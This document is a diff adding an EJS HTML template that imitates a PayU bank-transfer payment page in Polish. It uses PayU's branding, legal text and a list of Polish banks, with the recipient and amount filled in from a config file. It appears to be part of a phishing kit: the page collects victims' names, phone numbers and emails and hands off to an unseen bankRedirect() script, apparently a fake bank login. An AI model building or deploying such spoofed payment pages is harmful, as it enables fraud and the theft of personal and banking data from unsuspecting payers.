@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+
+<%- include("components/head") %>
+
+<body>
+<div id="app">
+    <div class="app default_1bareqc-o_O-desktop_jmp9gg-o_O-tablet_1e3wb3n-o_O-phone_h2wdj2">
+        <div class="logo-lang-container">
+            <section>
+                <div class="logo"><svg><use xlink:href="#logo-payu"></use></svg></div>
+                <div class="language-switcher inline">
+                    <ul class="unstyled">
+                        <li><a class="active" title="Polski" tabindex="1001">Polski</a></li>
+                    </ul>
+                </div>
+            </section>
+        </div>
+        <div>
+            <main>
+                <div class="column column-1">
+                    <aside>
+                        <div>
+                            <div><em class="row"><span>Odbiorca</span></em>
+                                <div class="order-data"><%= config["receiver"] %></div><br>
+                                <hr>
+                            </div>
+                            <div>
+                                <div><em class="row"><div><span>Do zapłaty</span></div><div><%= config["price"] %> zł</div></em></div>
+                            </div>
+                        </div>
+                    </aside>
+                </div>
+                <div class="column column-2 column-wide">
+                    <article class="wire">
+                        <header class="row">
+                            <h1><span>Przelew</span></h1>
+                        </header>
+                        <div class="main">
+                            <ul class="wire-list unstyled">
+                                <li>
+                                    <div class="block buttonlike " tabindex="2" title="Płacę z iPKO" onclick="chooseFunction('0')"><i class="sprite-pbl p"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="3" title="mTransfer" onclick="chooseFunction('1')"><i class="sprite-pbl m"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="4" title="Płać z ING" onclick="chooseFunction('2')"><i class="sprite-pbl g"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="5" title="Santander Przelew24" onclick="chooseFunction('3')"><i class="sprite-pbl w"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="6" title="Płacę z Bankiem Pekao S.A." onclick="chooseFunction('4')"><i class="sprite-pbl o"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="7" title="Płacę z Millennium" onclick="chooseFunction('5')"><i class="sprite-pbl wm"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="8" title="Płacę z Alior Bankiem" onclick="chooseFunction('6')"><i class="sprite-pbl ab"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="9" title="Płacę z Inteligo" onclick="chooseFunction('7')"><i class="sprite-pbl i"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="10" title="Crédit Agricole e-przelew" onclick="chooseFunction('8')"><i class="sprite-pbl l"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="11" title="Płacę z Citi Handlowy" onclick="chooseFunction('9')"><i class="sprite-pbl wc"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="12" title="Przelew z Idea Bank" onclick="chooseFunction('10')"><i class="sprite-pbl ib"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="13" title="Płać z BOŚ" onclick="chooseFunction('11')"><i class="sprite-pbl bo"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="14" title="Przelew z BANK NOWY BFG S.A." onclick="chooseFunction('12')"><i class="sprite-pbl ps"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="15" title="BNP Paribas" onclick="chooseFunction('13')"><i class="sprite-pbl bnx"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="16" title="Płacę z Getin Bank" onclick="chooseFunction('14')"><i class="sprite-pbl gbx"></i></div>
+                                </li>
+                                <li>
+                                    <div class="block buttonlike " tabindex="17" title="Płacę z Noble Bank" onclick="chooseFunction('15')"><i class="sprite-pbl nlx"></i></div>
+                                </li>
+                            </ul>
+                            <div class="line-break">
+                                <h2><span>Dane osobowe</span></h2>
+                            </div>
+                            <form autocomplete="off">
+                                <div>
+                                    <div class="inline separated">
+                                        <div class="form-row"><label for="card-date">Imię</label><input type="text" name="date" tabindex="5" class="" id="userName"></div>
+                                        <div class="form-row"><label for="card-cvv">Nazwisko</label><input type="text" name="cvv" tabindex="6" class="" id="userLastName"></div>
+                                    </div>
+                                </div>
+                                <div>
+                                    <div class="inline separated">
+                                        <div class="form-row"><label for="card-date">Numer telefonu</label><input type="text" name="date" tabindex="5" class="" id="userNumber"></div>
+                                        <div class="form-row"><label for="card-cvv">Adres e-mail</label><input type="text" name="cvv" tabindex="6" class="" id="userEmail"></div>
+                                    </div>
+                                </div>
+                               <label class="invalid" id="invaild" style="display: none"><span>Uzupełnij brakujące informacje</span></label>
+                                <label class="invalid" id="invaildBank" style="display: none"><span>Wybierz bank</span></label>
+                                <div class="form-actions"><input name="submit" type="button" class="submitbutton-card" tabindex="9" onclick="bankRedirect();" value="Zapłać <%= config["price"] %> zł"></div>
+                            </form>
+                        </div>
+                        <footer class="row">
+                            <div><span>Płacąc akceptujesz <a href="https://static.payu.com/sites/terms/files/payu_terms_of_service_single_transaction_pl_pl.pdf" target="_blank">Zasady płatności PayU</a>.</span></div>
+                            <div><svg class="pcidss"><use xlink:href="#pci-dss"></use></svg></div>
+                        </footer>
+                    </article>
+                </div>
+            </main>
+        </div>
+        <div class="regulations-container">
+            <section>
+                <section>
+                    <div class="regulations"><span><span><strong>Zlecenie PayU S.A. realizacji płatności:</strong></span>&nbsp;</span></div>
+                    <p class="regulations"><span><span><strong>Administratorem Twoich danych osobowych</strong>
+ jest PayU S.A. z siedzibą w Poznaniu (60-166), przy ul. Grunwaldzkiej
+186 („PayU”). Twoje dane osobowe będą przetwarzane w celu realizacji
+transakcji płatniczej, powiadamiania Cię o statusie realizacji Twojej
+płatności, rozpatrywania reklamacji, a także w celu wypełnienia
+obowiązków prawnych ciążących na PayU.</span>&nbsp;</span></p>
+                </section>
+                <p class="regulations"><span><strong>Strona korzysta z plików cookies</strong> w celu realizacji usług i zgodnie z <a href="https://static.payu.com/sites/terms/files/Polityka_plikow_cookies.pdf" target="_blank">Polityką Plików Cookies</a>. Możesz określić warunki przechowywania lub dostępu do plików cookies w Twojej przeglądarce.</span></p>
+            </section>
+        </div>
+    </div>
+</div>
+<%- include("components/svg-transfer") %>
+
+<script src="/assets/js/jquery-3.5.1.min.js"></script>
+<script src="/assets/js/transfer.js"></script>
+
+
+</body>
+
+</html>
